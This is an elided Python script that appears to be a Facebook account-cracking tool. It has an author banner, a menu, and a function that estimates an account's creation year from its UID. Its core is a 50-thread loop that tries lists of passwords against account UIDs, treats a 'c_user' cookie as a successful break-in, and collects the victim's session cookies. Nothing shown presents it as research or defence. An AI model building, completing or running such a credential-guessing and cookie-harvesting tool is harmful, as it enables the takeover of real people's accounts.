...
def o():
    ...
    if JAHID == 'C':
        ...
        return None
    if JAHID == 'D':
        os.system('xdg-open https://www.github.com/KgJAHID')
        return None
    if JAHID == 'E':
        os.system('exit')
        return None
...
logo = ("""
 ...
 \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mJAHID   \033[38;5;46m
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m JAHID               \033[38;5;46m
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mjhaid-444              \033[38;5;46m
 ...
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195m coming             \033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195mComing...
 \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°""")
def linex():
	print(' \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :JAHID = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :JAHID = ' ~> 2009'
        elif uid[:8] in ['10000000']        :JAHID = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:JAHID = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:JAHID = ' 2010'
        elif uid[:6] in ['100001']          :JAHID = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :JAHID = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :JAHID = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :JAHID = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :JAHID = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :JAHID = ' ~> 2015'
        elif uid[:5] in ['10001']           :JAHID = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :JAHID = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :JAHID = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :JAHID = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :JAHID = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:JAHID = ' ~> 2021'
        elif uid[:5] in ['10008']           :JAHID = ' ~>2022'
        elif uid[:5] in ['10009']           :JAHID = ' ~> 2023'
        else:JAHID=''
...
def JAHID():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mJAHID HASSAN')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [JAHID-CP🛠️] ' +uid+ ' | ' +ps+           '  \33[0;97m')
